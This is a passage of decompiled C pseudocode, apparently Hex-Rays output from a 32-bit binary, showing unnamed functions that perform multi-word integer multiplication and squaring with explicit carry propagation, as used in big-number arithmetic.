  result = a2[2] * a3[1] + *a3 * a2[3] + *a2 * a3[3] + HIDWORD(v11) + HIDWORD(v10) + HIDWORD(v9) + a2[1] * a3[2];
  a1[3] = result + HIDWORD(v12);
  return result;
}

//----- (00410085) --------------------------------------------------------
int __cdecl sub_410085(_DWORD *a1, unsigned int *a2, unsigned int *a3)
{
  __int64 v3; // rax
  unsigned int v4; // kr50_4
  __int64 v5; // kr68_8
  int v6; // kr30_4
  unsigned __int64 v7; // kr40_8
  unsigned __int64 v8; // rax
  unsigned __int64 v9; // kr48_8
  unsigned int v10; // ebx
  unsigned int v11; // edi
  unsigned int v12; // kr04_4
  unsigned int v13; // kr08_4
  unsigned __int64 v14; // rax
  unsigned int v15; // kr10_4
  int v16; // kr14_4
  unsigned __int64 v17; // kr58_8
  unsigned __int64 v18; // kr60_8
  int v19; // esi
  unsigned __int64 v20; // kr78_8
  unsigned __int64 v21; // rax
  unsigned __int64 v22; // kr80_8
  unsigned __int64 v23; // kr88_8
  unsigned int v24; // kr24_4
  unsigned __int64 v25; // krA8_8
  unsigned __int64 v26; // rax
  int v27; // kr28_4
  unsigned int v28; // kr2C_4
  unsigned __int64 v29; // krB0_8
  unsigned __int64 v30; // krB8_8
  unsigned __int64 v31; // krC8_8
  unsigned __int64 v32; // krD8_8
  unsigned __int64 v33; // krE8_8
  unsigned __int64 v34; // rax
  unsigned __int64 v35; // krF8_8
  unsigned __int64 v36; // kr100_8
  unsigned __int64 v37; // kr108_8
  unsigned __int64 v38; // kr110_8
  unsigned __int64 v39; // kr118_8
  unsigned __int64 v40; // kr120_8
  __int64 v41; // rcx
  int v42; // ebp
  __int64 v43; // rax
  int result; // eax

  v4 = *a3;
  v5 = *a2;
  v3 = *a3 * v5;
  *a1 = v3;
  v6 = (__PAIR64__(a3[1], v4) * v5) >> 32;
  v7 = (HIDWORD(v3) + a3[1] * (unsigned __int64)*a2) >> 32;
  v8 = *a3 * (unsigned __int64)a2[1];
  a1[1] = v6 + v8;
  v9 = (unsigned int)__CFADD__(v6, (_DWORD)v8) + HIDWORD(v8) + v7;
  v10 = (((a3[2] * (unsigned __int64)*a2 + (unsigned int)v9) >> 32) + HIDWORD(v9)) >> 32;
  v11 = ((a3[2] * (unsigned __int64)*a2 + (unsigned int)v9) >> 32) + HIDWORD(v9);
  v12 = a3[2] * *a2 + v9;
  v13 = (a3[1] * (unsigned __int64)a2[1] + v12) >> 32;
  v14 = *a3 * (unsigned __int64)a2[2];
  v15 = a3[1] * a2[1] + v12;
  v16 = *a3 * a2[2];
  a1[2] = v15 + v16;
  v17 = ((__PAIR64__(HIDWORD(v14), v15) + (unsigned int)v16) >> 32) + __PAIR64__(v10, v13) + v11;
  v18 = (unsigned int)v17 + a3[3] * (unsigned __int64)*a2;
  v19 = v18 + a3[2] * a2[1] + a3[1] * a2[2];
  v20 = (((unsigned int)v18 + a3[2] * a2[1] + a3[1] * (unsigned __int64)a2[2]) >> 32)
      + HIDWORD(v18)
      + (unsigned __int64)HIDWORD(v17)
      + (((unsigned int)v18 + a3[2] * (unsigned __int64)a2[1]) >> 32);
  v21 = *a3 * (unsigned __int64)a2[3];
  a1[3] = v19 + v21;
  v22 = (unsigned int)__CFADD__(v19, (_DWORD)v21) + HIDWORD(v21) + v20;
  v23 = (unsigned int)v22 + a3[4] * (unsigned __int64)*a2;
  v24 = a3[2] * a2[2] + v23 + a3[3] * a2[1];
  v25 = ((a3[1] * (unsigned __int64)a2[3] + v24) >> 32)
      + ((a3[2] * (unsigned __int64)a2[2] + (unsigned int)v23 + a3[3] * a2[1]) >> 32)
      + HIDWORD(v23)
      + (unsigned __int64)HIDWORD(v22)
      + (((unsigned int)v23 + a3[3] * (unsigned __int64)a2[1]) >> 32);
  v26 = *a3 * (unsigned __int64)a2[4];
  v27 = *a3 * a2[4];
  v28 = a3[1] * a2[3] + v24;
  a1[4] = v28 + v27;
  v29 = ((__PAIR64__(HIDWORD(v26), v28) + (unsigned int)v27) >> 32) + v25;
  v30 = a3[5] * (unsigned __int64)*a2 + (unsigned int)v29;
  v31 = (unsigned int)v30 + a3[4] * (unsigned __int64)a2[1];
  v32 = (unsigned int)v31 + a3[3] * (unsigned __int64)a2[2];
  v33 = a3[1] * (unsigned __int64)a2[4] + (unsigned int)v32 + a3[2] * a2[3];
  v34 = (unsigned int)v33 + *a3 * (unsigned __int64)a2[5];
  v35 = HIDWORD(v34)
      + HIDWORD(v33)
      + (((unsigned int)v32 + a3[2] * (unsigned __int64)a2[3]) >> 32)
      + HIDWORD(v32)
      + HIDWORD(v31)
      + HIDWORD(v30)
      + (unsigned __int64)HIDWORD(v29);
  a1[5] = v34;
  v36 = a3[6] * (unsigned __int64)*a2 + (unsigned int)v35;
  v37 = (unsigned int)v36 + a3[5] * (unsigned __int64)a2[1];
  v38 = (unsigned int)v37 + a3[4] * (unsigned __int64)a2[2];
  v39 = (unsigned int)v38 + a3[3] * (unsigned __int64)a2[3];
  v40 = (unsigned int)v39 + a3[2] * (unsigned __int64)a2[4];
  v41 = a3[1] * a2[5];
  LODWORD(v41) = a3[1] * a2[5] + v40;
  v42 = ((a3[1] * (unsigned __int64)a2[5] + (unsigned int)v40) >> 32)
      + HIDWORD(v40)
      + HIDWORD(v39)
      + HIDWORD(v38)
      + HIDWORD(v37)
      + HIDWORD(v36)
      + HIDWORD(v35);
  v43 = v41 + *a3 * (unsigned __int64)a2[6];
  a1[6] = v43;
  result = a3[6] * a2[1]
         + a3[5] * a2[2]
         + a3[4] * a2[3]
         + a2[5] * a3[2]
         + a2[4] * a3[3]
         + *a3 * a2[7]
         + *a2 * a3[7]
         + v42
         + a3[1] * a2[6];
  a1[7] = result + HIDWORD(v43);
  return result;
}

//----- (0041034B) --------------------------------------------------------
int __cdecl sub_41034B(_DWORD *a1, unsigned int *a2, unsigned int *a3)
{
  int result; // eax
  char v4[8]; // [esp+0h] [ebp-10h] BYREF
  int v5; // [esp+8h] [ebp-8h]
  int v6; // [esp+Ch] [ebp-4h]

  sub_40F864((int)v4, a2, a3);
  *a1 = v5;
  result = v6;
  a1[1] = v6;
  return result;
}
// 41034B: using guessed type char var_10[8];

//----- (00410375) --------------------------------------------------------
unsigned __int64 __cdecl sub_410375(_DWORD *a1, unsigned int *a2, unsigned int *a3, unsigned int a4)
{
  unsigned int v4; // esi
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // kr30_8
  unsigned __int64 v7; // kr40_8
  unsigned __int64 v8; // rax
  int v9; // kr48_4
  unsigned __int64 v10; // kr50_8
  int v11; // ecx
  unsigned __int64 v12; // rax
  unsigned __int64 result; // rax

  v4 = a3[3] * *a2
     + ((a3[1] * (unsigned __int64)a2[1]) >> 32)
     + ((a3[2] * (unsigned __int64)*a2) >> 32)
     + ((*a3 * (unsigned __int64)a2[2]) >> 32);
  v5 = a3[1] * a2[2] + v4 + a3[2] * a2[1] + *a3 * (unsigned __int64)a2[3];
  v6 = HIDWORD(v5)
     + (unsigned __int64)(a4 < (unsigned int)v5)
     + ((a3[1] * (unsigned __int64)a2[2] + v4 + a3[2] * a2[1]) >> 32)
     + ((a3[3] * (unsigned __int64)*a2
       + (unsigned int)(((a3[1] * (unsigned __int64)a2[1]) >> 32)
                      + ((a3[2] * (unsigned __int64)*a2) >> 32)
                      + ((*a3 * (unsigned __int64)a2[2]) >> 32))) >> 32)
     + ((((a3[1] * (unsigned __int64)a2[1]) >> 32)
       + ((a3[2] * (unsigned __int64)*a2) >> 32)
       + ((*a3 * (unsigned __int64)a2[2]) >> 32)) >> 32)
     + ((v4 + a3[2] * (unsigned __int64)a2[1]) >> 32);
  v7 = ((a3[3] * (unsigned __int64)a2[1] + (unsigned int)v6) >> 32)
     + HIDWORD(v6)
     + ((a3[2] * (unsigned __int64)a2[2] + a3[3] * a2[1] + (unsigned int)v6) >> 32);
  v8 = a3[2] * a2[2] + a3[3] * a2[1] + (_DWORD)v6 + a3[1] * (unsigned __int64)a2[3];
  *a1 = v8;
  v9 = HIDWORD(v8) + v7 + a3[3] * a2[2];
  v10 = (((unsigned int)(HIDWORD(v8) + v7) + a3[3] * (unsigned __int64)a2[2]) >> 32)
      + (unsigned int)__CFADD__(HIDWORD(v8), (_DWORD)v7)
      + HIDWORD(v7);
  LODWORD(v8) = a3[2] * a2[3];
  v11 = (a3[2] * (unsigned __int64)a2[3]) >> 32;
  a1[1] = v9 + v8;
  v12 = (unsigned int)__CFADD__(v9, (_DWORD)v8) + v11 + a3[3] * (unsigned __int64)a2[3];
  a1[2] = v10 + v12;
  result = v10 + v12;
  a1[3] = HIDWORD(result);
  return result;
}

//----- (00410497) --------------------------------------------------------
unsigned __int64 __cdecl sub_410497(_DWORD *a1, unsigned int *a2, unsigned int *a3, unsigned int a4)
{
  unsigned __int64 v4; // kr98_8
  unsigned int v5; // esi
  unsigned int v6; // kr04_4
  unsigned int v7; // edx
  int v8; // esi
  unsigned int v9; // ebp
  unsigned int v10; // edi
  unsigned int v11; // kr0C_4
  unsigned int v12; // edx
  int v13; // esi
  unsigned __int64 v14; // krD8_8
  unsigned __int64 v15; // rax
  unsigned __int64 v16; // krE0_8
  unsigned int v17; // esi
  unsigned int v18; // kr20_4
  int v19; // esi
  unsigned int v20; // ebx
  unsigned int v21; // ebp
  int v22; // kr30_4
  unsigned __int64 v23; // rax
  unsigned __int64 v24; // kr108_8
  unsigned int v25; // esi
  unsigned int v26; // kr3C_4
  int v27; // esi
  unsigned int v28; // ebx
  unsigned int v29; // edi
  unsigned int v30; // kr44_4
  int v31; // esi
  unsigned int v32; // edi
  int v33; // kr138_4
  unsigned __int64 v34; // rax
  unsigned __int64 v35; // kr140_8
  unsigned int v36; // kr54_4
  unsigned __int64 v37; // kr168_8
  unsigned __int64 v38; // rax
  int v39; // kr58_4
  unsigned int v40; // kr5C_4
  unsigned __int64 v41; // kr170_8
  unsigned int v42; // esi
  unsigned int v43; // ebx
  unsigned int v44; // edi
  int v45; // esi
  unsigned int v46; // kr68_4
  unsigned __int64 v47; // rax
  unsigned __int64 v48; // kr190_8
  unsigned int v49; // esi
  unsigned __int64 v50; // kr1B0_8
  unsigned __int64 v51; // rax
  int v52; // kr74_4
  unsigned int v53; // kr78_4
  unsigned __int64 v54; // kr1B8_8
  int v55; // esi
  unsigned __int64 v56; // kr1C8_8
  int v57; // ecx
  unsigned __int64 v58; // rax
  unsigned __int64 result; // rax

  v4 = ((a3[5] * (unsigned __int64)a2[1]) >> 32)
     + ((a3[4] * (unsigned __int64)a2[2]) >> 32)
     + ((a3[3] * (unsigned __int64)a2[3]) >> 32)
     + ((a3[2] * (unsigned __int64)a2[4]) >> 32)
     + ((a3[1] * (unsigned __int64)a2[5]) >> 32)
     + ((a3[6] * (unsigned __int64)*a2) >> 32)
     + ((*a3 * (unsigned __int64)a2[6]) >> 32);
  v5 = a3[7] * *a2 + v4;
  v6 = (v5 + a3[6] * (unsigned __int64)a2[1]) >> 32;
  v7 = (a3[5] * (unsigned __int64)a2[2] + v5 + a3[6] * a2[1]) >> 32;
  v8 = a3[5] * a2[2] + v5 + a3[6] * a2[1];
  v9 = (v7 + ((a3[7] * (unsigned __int64)*a2 + (unsigned int)v4) >> 32) + HIDWORD(v4) + v6) >> 32;
  v10 = v7 + ((a3[7] * (unsigned __int64)*a2 + (unsigned int)v4) >> 32) + HIDWORD(v4) + v6;
  v11 = ((unsigned int)v8 + a3[4] * (unsigned __int64)a2[3]) >> 32;
  v12 = (a3[3] * (unsigned __int64)a2[4] + v8 + a3[4] * a2[3]) >> 32;
  v13 = a3[3] * a2[4] + v8 + a3[4] * a2[3];
  v14 = ((a3[1] * (unsigned __int64)a2[6] + v13 + a3[2] * a2[5]) >> 32)
      + v12
      + __PAIR64__(v9, v11)
      + v10
      + (((unsigned int)v13 + a3[2] * (unsigned __int64)a2[5]) >> 32);
  v15 = a3[1] * a2[6] + v13 + a3[2] * a2[5] + *a3 * (unsigned __int64)a2[7];
  v16 = HIDWORD(v15) + (unsigned __int64)(a4 < (unsigned int)v15) + v14;
  v17 = a3[7] * a2[1] + v16;
  v18 = (v17 + a3[6] * (unsigned __int64)a2[2]) >> 32;
  HIDWORD(v15) = (a3[5] * (unsigned __int64)a2[3] + v17 + a3[6] * a2[2]) >> 32;
  v19 = a3[5] * a2[3] + v17 + a3[6] * a2[2];
  v20 = (((a3[3] * (unsigned __int64)a2[5] + v19 + a3[4] * a2[4]) >> 32)
       + HIDWORD(v15)
       + ((a3[7] * (unsigned __int64)a2[1] + (unsigned int)v16) >> 32)
       + HIDWORD(v16)
       + v18
       + (((unsigned int)v19 + a3[4] * (unsigned __int64)a2[4]) >> 32)) >> 32;
  v21 = ((a3[3] * (unsigned __int64)a2[5] + v19 + a3[4] * a2[4]) >> 32)
      + HIDWORD(v15)
      + ((a3[7] * (unsigned __int64)a2[1] + (unsigned int)v16) >> 32)
      + HIDWORD(v16)
      + v18
      + (((unsigned int)v19 + a3[4] * (unsigned __int64)a2[4]) >> 32);
  v22 = a3[3] * a2[5] + v19 + a3[4] * a2[4];
  v23 = a3[2] * a2[6] + v22 + a3[1] * (unsigned __int64)a2[7];
  v24 = HIDWORD(v23) + __PAIR64__(v20, (a3[2] * (unsigned __int64)a2[6] + (unsigned int)v22) >> 32) + v21;
  *a1 = v23;
  v25 = a3[7] * a2[2] + v24;
  v26 = (v25 + a3[6] * (unsigned __int64)a2[3]) >> 32;
  HIDWORD(v23) = (a3[5] * (unsigned __int64)a2[4] + v25 + a3[6] * a2[3]) >> 32;
  v27 = a3[5] * a2[4] + v25 + a3[6] * a2[3];
  v29 = (HIDWORD(v23) + ((a3[7] * (unsigned __int64)a2[2] + (unsigned int)v24) >> 32) + HIDWORD(v24) + v26) >> 32;
  v28 = HIDWORD(v23) + ((a3[7] * (unsigned __int64)a2[2] + (unsigned int)v24) >> 32) + HIDWORD(v24) + v26;
  v30 = ((unsigned int)v27 + a3[4] * (unsigned __int64)a2[5]) >> 32;
  HIDWORD(v23) = (a3[3] * (unsigned __int64)a2[6] + v27 + a3[4] * a2[5]) >> 32;
  v31 = a3[3] * a2[6] + v27 + a3[4] * a2[5];
  v33 = HIDWORD(v23) + v30 + v28;
  v32 = (HIDWORD(v23) + __PAIR64__(v29, v30) + v28) >> 32;
  v34 = a3[2] * (unsigned __int64)a2[7];
  a1[1] = v31 + v34;
  v35 = __PAIR64__(v32, (unsigned int)__CFADD__(v31, (_DWORD)v34) + HIDWORD(v34)) + (unsigned int)v33;
  v36 = v35 + a3[7] * a2[3] + a3[6] * a2[4] + a3[5] * a2[5];
  v37 = ((a3[4] * (unsigned __int64)a2[6] + v36) >> 32)
      + (((_DWORD)v35 + a3[7] * a2[3] + a3[6] * a2[4] + a3[5] * (unsigned __int64)a2[5]) >> 32)
      + (((unsigned int)v35 + a3[7] * (unsigned __int64)a2[3]) >> 32)
      + HIDWORD(v35)
      + (((unsigned int)v35 + a3[7] * a2[3] + a3[6] * (unsigned __int64)a2[4]) >> 32);
  v38 = a3[3] * (unsigned __int64)a2[7];
  v39 = a3[3] * a2[7];
  v40 = a3[4] * a2[6] + v36;
  a1[2] = v40 + v39;
  v41 = ((__PAIR64__(HIDWORD(v38), v40) + (unsigned int)v39) >> 32) + v37;
  v42 = v41 + a3[7] * a2[4];
  v44 = ((((unsigned int)v41 + a3[7] * (unsigned __int64)a2[4]) >> 32)
       + HIDWORD(v41)
       + ((v42 + a3[6] * (unsigned __int64)a2[5]) >> 32)) >> 32;
  v43 = (((unsigned int)v41 + a3[7] * (unsigned __int64)a2[4]) >> 32)
      + HIDWORD(v41)
      + ((v42 + a3[6] * (unsigned __int64)a2[5]) >> 32);
  HIDWORD(v38) = (a3[5] * (unsigned __int64)a2[6] + v42 + a3[6] * a2[5]) >> 32;
  v45 = a3[5] * a2[6] + v42 + a3[6] * a2[5];
  v46 = HIDWORD(v38);
  v47 = a3[4] * (unsigned __int64)a2[7];
  a1[3] = v45 + v47;
  v48 = __PAIR64__(v44, v46) + v43 + (unsigned int)__CFADD__(v45, (_DWORD)v47) + HIDWORD(v47);
  v49 = v48 + a3[7] * a2[5];
  v50 = ((a3[6] * (unsigned __int64)a2[6] + v49) >> 32)
      + (((unsigned int)v48 + a3[7] * (unsigned __int64)a2[5]) >> 32)
      + HIDWORD(v48);
  v51 = a3[5] * (unsigned __int64)a2[7];
  v52 = a3[5] * a2[7];
  v53 = a3[6] * a2[6] + v49;
  a1[4] = v53 + v52;
  v54 = ((__PAIR64__(HIDWORD(v51), v53) + (unsigned int)v52) >> 32) + v50;
  v55 = v54 + a3[7] * a2[6];
  v56 = (((unsigned int)v54 + a3[7] * (unsigned __int64)a2[6]) >> 32) + HIDWORD(v54);
  LODWORD(v51) = a3[6] * a2[7];
  v57 = (a3[6] * (unsigned __int64)a2[7]) >> 32;
  a1[5] = v55 + v51;
  v58 = (unsigned int)__CFADD__(v55, (_DWORD)v51) + v57 + a3[7] * (unsigned __int64)a2[7];
  a1[6] = v56 + v58;
  result = v56 + v58;
  a1[7] = HIDWORD(result);
  return result;
}

//----- (0041083F) --------------------------------------------------------
_DWORD *__cdecl sub_41083F(_DWORD *a1, unsigned int *a2)
{
  unsigned __int64 v3; // rax
  unsigned __int64 v4; // kr08_8
  _DWORD *result; // eax
  unsigned __int64 v6; // kr18_8
  BOOL v7; // [esp+18h] [ebp+8h]

  v3 = *a2 * (unsigned __int64)*a2;
  *a1 = v3;
  v4 = a2[1] * (unsigned __int64)*a2;
  a1[1] = 2 * v4 + HIDWORD(v3);
  v7 = __CFADD__(2 * v4, HIDWORD(v3));
  result = a1;
  v6 = ((unsigned int)v4 >> 31) + 2i64 * HIDWORD(v4) + a2[1] * (unsigned __int64)a2[1];
  a1[2] = v7 + v6;
  a1[3] = __CFADD__(v7, (_DWORD)v6) + HIDWORD(v6);
  return result;
}

//----- (004108A7) --------------------------------------------------------
_DWORD *__cdecl sub_4108A7(_DWORD *a1, unsigned int *a2)
{
  unsigned __int64 v3; // rax
  unsigned int v4; // edi
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // kr00_8
  unsigned int v7; // esi
  unsigned __int64 v8; // kr10_8
  unsigned __int64 v9; // rax
  unsigned __int64 v10; // kr30_8
  unsigned __int64 v12; // rcx
  unsigned int v13; // edi
  unsigned __int64 v14; // kr40_8
  unsigned __int64 v15; // kr48_8
  unsigned __int64 v16; // rax
  unsigned int v17; // ebp
  unsigned int v18; // kr24_4
  unsigned __int64 v20; // kr68_8
  unsigned __int64 v21; // kr70_8
  int v22; // ebp
  _DWORD *result; // eax
  unsigned __int64 v24; // kr80_8
  int v25; // [esp+10h] [ebp-8h]
  int v26; // [esp+14h] [ebp-4h]

  v3 = *a2 * (unsigned __int64)*a2;
  *a1 = v3;
  v4 = HIDWORD(v3);
  v5 = ((a2[1] * *a2) >> 31) + 2 * ((a2[1] * (unsigned __int64)*a2) >> 32);
  v6 = __PAIR64__(v5, 2 * a2[1] * *a2) + v4;
  v25 = HIDWORD(v5) + __CFADD__((_DWORD)v5, HIDWORD(v6));
  a1[1] = v6;
  v7 = a2[2] * *a2;
  v8 = 2 * ((a2[2] * (unsigned __int64)*a2) >> 32) + (v7 >> 31);
  v9 = 2 * v7 + a2[1] * (unsigned __int64)a2[1];
  v10 = __PAIR64__(v25, v9) + HIDWORD(v6);
  a1[2] = v10;
  v12 = a2[3] * (unsigned __int64)*a2;
  v13 = a2[2] * a2[1] + v12;
  v14 = 2 * v13 + v8 + HIDWORD(v9) + (unsigned __int64)HIDWORD(v10);
  v15 = 2i64 * HIDWORD(v12)
      + (v13 >> 31)
      + 2 * ((a2[2] * (unsigned __int64)a2[1] + (unsigned int)v12) >> 32)
      + HIDWORD(v14);
  a1[3] = v14;
  v16 = 2 * a2[3] * a2[1] + a2[2] * (unsigned __int64)a2[2];
  v26 = v16 + v15;
  v17 = (HIDWORD(v16) + ((v15 + (unsigned int)v16) >> 32)) >> 32;
  v18 = HIDWORD(v16) + ((v15 + (unsigned int)v16) >> 32);
  LODWORD(v16) = 2 * ((a2[3] * (unsigned __int64)a2[1]) >> 32) + ((a2[3] * a2[1]) >> 31) + v18;
  v20 = 2 * ((a2[3] * (unsigned __int64)a2[1]) >> 32) + ((a2[3] * a2[1]) >> 31) + __PAIR64__(v17, v18);
  a1[4] = v26;
  v21 = a2[3] * (unsigned __int64)a2[2];
  v22 = __CFADD__(2 * v21, (_DWORD)v16) + HIDWORD(v20);
  a1[5] = 2 * v21 + v16;
  result = a1;
  v24 = ((unsigned int)v21 >> 31) + 2i64 * HIDWORD(v21) + a2[3] * (unsigned __int64)a2[3];
  a1[6] = v22 + v24;
  a1[7] = __CFADD__(v22, (_DWORD)v24) + HIDWORD(v24);
  return result;
}

//----- (00410A44) --------------------------------------------------------
_DWORD *__cdecl sub_410A44(_DWORD *a1, unsigned int *a2)
{
  unsigned __int64 v3; // rax
  unsigned int v4; // edi
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // kr00_8
  unsigned int v7; // esi
  unsigned __int64 v8; // rax
  unsigned __int64 v9; // kr78_8
  int v11; // kr0C_4
  unsigned int v12; // edi
  unsigned int v13; // esi
  int v14; // ecx
  bool v15; // cf
  unsigned __int64 v16; // kr90_8
  unsigned int v17; // edi
  unsigned __int64 v18; // kr98_8
  unsigned __int64 v19; // rax
  unsigned __int64 v20; // krA0_8
  unsigned __int64 v22; // krA8_8
  unsigned __int64 v23; // krB8_8
  unsigned int v24; // esi
  unsigned __int64 v25; // krC8_8
  unsigned __int64 v27; // krD0_8
  unsigned __int64 v28; // krE0_8
  unsigned __int64 v29; // rax
  unsigned __int64 v30; // krF0_8
  __int64 v32; // rcx
  unsigned __int64 v33; // kr110_8
  unsigned __int64 v34; // kr120_8
  unsigned int v35; // esi
  unsigned __int64 v36; // kr130_8
  unsigned __int64 v37; // kr140_8
  unsigned __int64 v38; // kr150_8
  unsigned __int64 v39; // rax
  unsigned __int64 v40; // kr158_8
  unsigned __int64 v41; // kr170_8
  unsigned int v42; // edi
  unsigned int v43; // esi
  __int64 v44; // kr190_8
  int v45; // kr44_4
  unsigned int v46; // edi
  unsigned __int64 v47; // kr1A0_8
  unsigned __int64 v48; // rax
  unsigned __int64 v49; // kr1A8_8
  int v50; // kr50_4
  unsigned __int64 v51; // kr1B8_8
  unsigned __int64 v52; // kr1C0_8
  unsigned __int64 v53; // rax
  unsigned int v54; // ebp
  unsigned int v55; // kr68_4
  unsigned __int64 v57; // kr1E0_8
  unsigned __int64 v58; // kr1E8_8
  int v59; // ebp
  _DWORD *result; // eax
  unsigned __int64 v61; // kr1F8_8
  int v62; // [esp+10h] [ebp-Ch]
  unsigned __int64 v63; // [esp+10h] [ebp-Ch]
  unsigned __int64 v64; // [esp+10h] [ebp-Ch]
  __int64 v65; // [esp+10h] [ebp-Ch]

  v3 = *a2 * (unsigned __int64)*a2;
  *a1 = v3;
  v4 = HIDWORD(v3);
  v5 = ((a2[1] * *a2) >> 31) + 2 * ((a2[1] * (unsigned __int64)*a2) >> 32);
  v6 = __PAIR64__(v5, 2 * a2[1] * *a2) + v4;
  v62 = HIDWORD(v5) + __CFADD__((_DWORD)v5, HIDWORD(v6));
  a1[1] = v6;
  v7 = a2[2] * *a2;
  v8 = 2 * v7 + a2[1] * (unsigned __int64)a2[1];
  v9 = __PAIR64__(v62, v8) + HIDWORD(v6);
  v63 = 2 * ((a2[2] * (unsigned __int64)*a2) >> 32) + (v7 >> 31) + HIDWORD(v8) + (unsigned __int64)HIDWORD(v9);
  a1[2] = v9;
  v11 = a2[3] * *a2;
  v12 = a2[2] * a2[1] + v11;
  v13 = 2 * ((a2[3] * (unsigned __int64)*a2) >> 32)
      + (v12 >> 31)
      + 2 * ((a2[2] * (unsigned __int64)a2[1] + (unsigned int)v11) >> 32);
  v14 = 2 * v12 + v63;
  v15 = __CFADD__(v13, (__PAIR64__(v13, 2 * v12) + v63) >> 32);
  HIDWORD(v63) = (__PAIR64__(v13, 2 * v12) + v63) >> 32;
  LODWORD(v63) = ((2 * ((a2[3] * (unsigned __int64)*a2) >> 32)
                 + (v12 >> 31)
                 + 2 * ((a2[2] * (unsigned __int64)a2[1] + (unsigned int)v11) >> 32)) >> 32)
               + v15;
  a1[3] = v14;
  v16 = a2[4] * (unsigned __int64)*a2;
  v17 = a2[3] * a2[1] + v16;
  v18 = (v17 >> 31) + 2 * ((a2[3] * (unsigned __int64)a2[1] + (unsigned int)v16) >> 32);
  v19 = 2 * v17 + a2[2] * (unsigned __int64)a2[2];
  v20 = (unsigned int)v19 + __PAIR64__(v63, HIDWORD(v63));
  a1[4] = v20;
  v22 = a2[4] * (unsigned __int64)a2[1] + a2[5] * *a2;
  v23 = (unsigned int)v22 + a2[3] * (unsigned __int64)a2[2];
  v24 = 2 * (HIDWORD(v22) + ((a2[5] * (unsigned __int64)*a2) >> 32)) + ((unsigned int)v23 >> 31) + 2 * HIDWORD(v23);
  v25 = __PAIR64__(v24, 2 * (int)v23) + 2i64 * HIDWORD(v16) + v18 + HIDWORD(v19) + (unsigned __int64)HIDWORD(v20);
  LODWORD(v63) = ((2 * (HIDWORD(v22) + ((a2[5] * (unsigned __int64)*a2) >> 32))
                 + ((unsigned int)v23 >> 31)
                 + 2i64 * HIDWORD(v23)) >> 32)
               + __CFADD__(v24, HIDWORD(v25));
  a1[5] = v25;
  v27 = a2[5] * (unsigned __int64)a2[1] + a2[6] * *a2;
  v28 = (unsigned int)v27 + a2[4] * (unsigned __int64)a2[2];
  v29 = (unsigned int)(2 * v28) + a2[3] * (unsigned __int64)a2[3];
  v30 = (unsigned int)v29 + __PAIR64__(v63, HIDWORD(v25));
  v64 = 2 * (HIDWORD(v27) + ((a2[6] * (unsigned __int64)*a2) >> 32))
      + 2i64 * HIDWORD(v28)
      + ((unsigned int)v28 >> 31)
      + HIDWORD(v29)
      + (unsigned __int64)HIDWORD(v30);
  a1[6] = v30;
  v32 = a2[7] * *a2;
  v33 = a2[5] * (unsigned __int64)a2[2] + (unsigned int)v32 + a2[6] * a2[1];
  v34 = a2[4] * (unsigned __int64)a2[3] + (unsigned int)v33;
  HIDWORD(v29) = (2
                * (HIDWORD(v33)
                 + __PAIR64__(HIDWORD(v32), (v32 + a2[6] * (unsigned __int64)a2[1]) >> 32)
                 + __PAIR64__(HIDWORD(v32), (a2[7] * (unsigned __int64)*a2) >> 32))
                + 2i64 * HIDWORD(v34)
                + ((unsigned int)v34 >> 31)) >> 32;
  v35 = 2 * (HIDWORD(v33) + ((v32 + a2[6] * (unsigned __int64)a2[1]) >> 32) + ((a2[7] * (unsigned __int64)*a2) >> 32))
      + 2 * HIDWORD(v34)
      + ((unsigned int)v34 >> 31);
  HIDWORD(v32) = a2;
  LODWORD(v32) = 2 * v34 + v64;
  v15 = __CFADD__(v35, (__PAIR64__(v35, 2 * (int)v34) + v64) >> 32);
  HIDWORD(v64) = (__PAIR64__(v35, 2 * (int)v34) + v64) >> 32;
  LODWORD(v64) = HIDWORD(v29) + v15;
  a1[7] = v32;
  v36 = *(unsigned int *)(HIDWORD(v32) + 24) * (unsigned __int64)*(unsigned int *)(HIDWORD(v32) + 8)
      + (unsigned int)(*(_DWORD *)(HIDWORD(v32) + 28) * *(_DWORD *)(HIDWORD(v32) + 4));
  v37 = (unsigned int)v36 + a2[5] * (unsigned __int64)a2[3];
  v38 = 2
      * (HIDWORD(v36)
       + ((*(unsigned int *)(HIDWORD(v32) + 28) * (unsigned __int64)*(unsigned int *)(HIDWORD(v32) + 4)) >> 32))
      + 2i64 * HIDWORD(v37)
      + ((unsigned int)v37 >> 31);
  HIDWORD(v32) = HIDWORD(v38);
  v39 = (unsigned int)(2 * v37) + a2[4] * (unsigned __int64)a2[4];
  v40 = (unsigned int)v39 + __PAIR64__(v64, HIDWORD(v64));
  LODWORD(v32) = HIDWORD(v39) + HIDWORD(v40);
  v65 = __PAIR64__((HIDWORD(v39) + (unsigned __int64)HIDWORD(v40)) >> 32, v38) + v32;
  a1[8] = v40;
  v41 = a2[6] * (unsigned __int64)a2[3] + a2[7] * a2[2];
  v42 = v41 + a2[5] * a2[4];
  v43 = 2 * (HIDWORD(v41) + ((a2[7] * (unsigned __int64)a2[2]) >> 32))
      + (v42 >> 31)
      + 2 * (((unsigned int)v41 + a2[5] * (unsigned __int64)a2[4]) >> 32);
  HIDWORD(v32) = a2;
  v44 = __PAIR64__(v43, 2 * v42) + v65;
  LODWORD(v65) = ((2 * (HIDWORD(v41) + ((a2[7] * (unsigned __int64)a2[2]) >> 32))
                 + (v42 >> 31)
                 + 2 * (((unsigned int)v41 + a2[5] * (unsigned __int64)a2[4]) >> 32)) >> 32)
               + __CFADD__(v43, (__PAIR64__(v43, 2 * v42) + v65) >> 32);
  a1[9] = v44;
  v45 = *(_DWORD *)(HIDWORD(v32) + 28) * *(_DWORD *)(HIDWORD(v32) + 12);
  v46 = *(_DWORD *)(HIDWORD(v32) + 24) * *(_DWORD *)(HIDWORD(v32) + 16) + v45;
  v47 = 2 * ((*(unsigned int *)(HIDWORD(v32) + 28) * (unsigned __int64)*(unsigned int *)(HIDWORD(v32) + 12)) >> 32)
      + (v46 >> 31)
      + 2
      * ((*(unsigned int *)(HIDWORD(v32) + 24) * (unsigned __int64)*(unsigned int *)(HIDWORD(v32) + 16)
        + (unsigned int)v45) >> 32);
  v48 = 2 * v46 + a2[5] * (unsigned __int64)a2[5];
  v49 = (unsigned int)v48 + __PAIR64__(v65, HIDWORD(v44));
  a1[10] = v49;
  v50 = a2[7] * a2[4];
  v51 = 2 * (a2[6] * a2[5] + v50) + v47 + HIDWORD(v48) + (unsigned __int64)HIDWORD(v49);
  v52 = 2 * ((a2[7] * (unsigned __int64)a2[4]) >> 32)
